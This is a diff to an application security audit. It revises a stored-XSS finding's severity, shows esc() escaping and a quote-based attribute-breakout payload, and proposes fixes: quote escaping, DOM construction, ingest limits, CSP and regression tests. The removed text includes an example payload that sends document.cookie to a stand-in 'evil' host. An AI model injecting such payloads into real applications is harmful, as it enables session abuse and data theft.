@@ -2312,34 +2312,81 @@ direction). This is the correct pattern and needs no work.
 
 ## N.3 Verified defect — stored XSS
 
-`app/static/app.js` renders uploaded strings into the DOM with `innerHTML` and
-template literals. **[V]** Asset names, business-unit names, scenario names,
-finding titles, `source_ref` values, and quarantine payloads are all
-attacker-controllable via a CSV upload, and none are escaped before insertion.
+`app/static/app.js` renders uploaded strings into the DOM using `innerHTML` with
+template literals, which is the pattern that produces XSS. **An earlier draft of
+this section called this Critical and said it was exploitable in text
+positions. Testing it showed that claim was wrong, and the corrected finding is
+below.**
 
-An uploaded asset named `<img src=x onerror="fetch('//evil/'+document.cookie)">`
-executes in the session of whoever next opens the dashboard. The session cookie is
-`HttpOnly`, so the cookie itself cannot be read — but the script runs with the
-user's origin, can call every API endpoint the user is authorised for, and can
-exfiltrate the entire assessment.
+**What the code actually does [V].** There is a single helper:
 
-**This is the most severe finding in this document.** It is a single-operator
-local tool today, which is why it is not an emergency; it becomes an
-authentication-bypass class vulnerability the moment the tool is reachable by
-anyone but the operator.
+```javascript
+function esc(text) {
+  return String(text === null || text === undefined ? "" : text)
+    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+```
+
+Every attacker-controllable value interpolated into an HTML **text** position is
+wrapped in `esc()` — scenario names, asset names, business units, threat actors,
+control names, `source_ref`, `component_code`, finding titles, quarantine
+reasons, filenames, AI answers, and AI warnings. Because `<` and `>` are
+escaped, tag injection in those positions is **neutralised**. I verified this:
+a `scenario_code` of `S2<img src=x onerror=alert(1)>` renders as
+`S2&lt;img src=x onerror=alert(1)&gt;` and creates no element. `toast()` uses
+`textContent`, not `innerHTML`, so the unescaped `${code}` inside the toast and
+`window.prompt` strings at `app.js:194` and `app.js:205` are also safe.
+
+**The real gap is the attribute context, because `esc()` does not escape
+quotes.** `app.js:148` writes:
+
+```javascript
+<td><button class="ghost" data-scenario="${esc(s.scenario_code)}">what-if</button></td>
+```
+
+`scenario_code` is a `natural_key` string field with **no character or length
+validation** (`app/ingest.py:117`), so a `"` is accepted and stored. Measured
+end to end: uploading `scenario_code = S1" onmouseover="alert(1)` committed the row,
+and the rendered markup was
+
+```html
+<button data-scenario="S1" onmouseover="alert(1)">what-if</button>
+```
+
+— the payload broke out of the attribute and became a live event handler that
+fires for every user who opens the exposure table. That is genuine stored XSS,
+reproducible in two steps, and it is the finding that belongs in this document.
+
+**Corrected severity: Medium, not Critical.** It is one attribute sink, not
+sixteen text sinks; the cookie is `HttpOnly` so the token cannot be read, but the
+script runs in the user's origin and can call any API that user is authorised for.
+It becomes high severity the moment the tool is reachable by anyone but the
+operator.
 
 Fix: **[P]**
 
-1. Replace every `innerHTML =` assignment that interpolates data with
-   `textContent` assignment, or route the value through a single
-   `esc()` helper applied at the point of insertion.
-2. Where markup is genuinely needed (static chrome), use a build-time template or
-   DOM construction, never string interpolation.
-3. Add `Content-Security-Policy` as defence in depth: `default-src 'self'`,
-   `script-src 'self'` with no `unsafe-inline`, which makes inline handlers
-   non-executable even if the escaping is missed.
-4. Add a regression test that uploads a payload-bearing asset name and asserts the
-   rendered DOM contains it as text, not as an element.
+1. **Extend `esc()` to a proper attribute-and-text escape**, including `"`, `'`,
+   and backtick:
+   ```javascript
+   function esc(text) {
+     return String(text ?? "")
+       .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+       .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
+   }
+   ```
+2. **For identifiers in attributes, build the DOM instead of a string.** Read
+   the value from the element's dataset (which the code already does correctly at
+   `app.js:189` via `button.dataset.scenario`) rather than re-serialising it into
+   markup. This removes the sink class entirely rather than escaping it.
+3. **Constrain natural keys at ingest** to a conservative character set
+   (alphanumerics, `-`, `_`, `.`) and a length limit. An identifier has no
+   business containing a quote or a space.
+4. **Add `Content-Security-Policy` as defence in depth** — `default-src 'self'`,
+   `script-src 'self'` with no `unsafe-inline`. This alone neutralises
+   `onmouseover=` even if escaping regresses.
+5. **Add a regression test** that uploads payloads into every natural-key and
+   free-text field and asserts the rendered DOM contains them as text, not as
+   elements or attributes.
 
 Tracked as **F-3**.
 
@@ -2405,7 +2452,7 @@ number.
 |---|---|---|---|
 | **F-1** | `runs` and `snapshots` tables exist but are never written; no assessment is reproducible | **Critical** | Open |
 | **F-2** | No field length limits in `DATASET_SCHEMAS`; unbounded strings accepted | High | Open |
-| **F-3** | Stored XSS via unescaped `innerHTML` with uploaded values | **Critical** | Open |
+| **F-3** | Stored XSS in one attribute sink: `esc()` omits `"`, and `data-scenario` interpolates a user-controlled natural key | **Medium** | Open |
 | **F-4** | Default credentials seeded and printed in the UI | High | Open |
 | **F-5** | No brute-force protection or rate limiting on login | High | Open |
 | **F-6** | No session rotation on login or privilege change | Medium | Open |
@@ -2431,8 +2478,8 @@ number.
 | **F-26** | CSV export has no formula-injection defence; a leading `=`/`+`/`-`/`@` is written verbatim | Medium | Open |
 | **F-27** | Failed logins are not written to the audit log, so brute-force is invisible | Medium | Open |
 
-F-1 and F-3 are the two that must be closed before any deployment beyond a single
-operator's laptop. F-1 undermines the product's core claim; F-3 is
+F-1 is the one that must be closed before any deployment beyond a single
+operator's laptop, because it undermines the product's core claim. F-3 is
 authentication-bypass class. F-22 is the most likely to be hit accidentally, since
 it needs no attacker — only a portfolio with 16 actions.
 ---
@@ -2568,7 +2615,7 @@ become fiction.
 | 0.2 | Write every assessment to `assessment_runs` + `input_snapshots`; add `run_id` to every export | **F-1** |
 | 0.3 | Add `model_fingerprint` and `ENGINE_VERSION`; expose `/api/assessment/runs/{id}` and a replay endpoint | F-1, F.7 |
 | 0.4 | Include `breakdown` in the AI context; ground-check the template and refusal paths | **F-8** |
-| 0.5 | Escape all `innerHTML` interpolation; add a CSP and an XSS regression test | **F-3**, F-18 |
+| 0.5 | Fix the attribute sink, harden `esc()`, constrain natural keys, add CSP and an XSS regression test | **F-3**, F-18 |
 | 0.6 | Add `max_length` to `FieldSpec` and enforce it in validation | F-2 |
 | 0.7 | Remove credentials from the UI; refuse default credentials in a production profile; force a first-run password change | **F-4** |
 | 0.8 | Login rate limiting with backoff; session rotation on login and privilege change | F-5, F-6 |
@@ -2638,7 +2685,7 @@ output matching this document.
 
 ```mermaid
 flowchart LR
-    P0["Phase 0<br/>Honesty and safety<br/>F-1, F-3, F-8, F-22"] --> P1["Phase 1<br/>Production hardening<br/>assumptions, ROSI, headers"]
+    P0["Phase 0<br/>Honesty and safety<br/>F-1, F-8, F-22, F-25"] --> P1["Phase 1<br/>Production hardening<br/>assumptions, ROSI, headers"]
     P1 --> P2["Phase 2<br/>Scale and integration<br/>Postgres, tenancy, connectors"]
     P2 --> P3["Phase 3<br/>Framework reporting<br/>GATED on scope decision"]
     P0 -.->|"F-1 required"| P3
@@ -2768,7 +2815,7 @@ Full register in section N.6.
 | ID | Finding | Sev | Phase |
 |---|---|---|---|
 | F-1 | `runs`/`snapshots` never written; assessments not reproducible | Critical | 0 |
-| F-3 | Stored XSS via unescaped `innerHTML` | Critical | 0 |
+| F-3 | Stored XSS via attribute-context injection (`esc()` misses quotes) | Medium | 1 |
 | F-4 | Default credentials seeded and printed in UI | High | 0 |
 | F-5 | No brute-force protection | High | 0 |
 | F-7 | `users.manage` has no route | High | 0 |
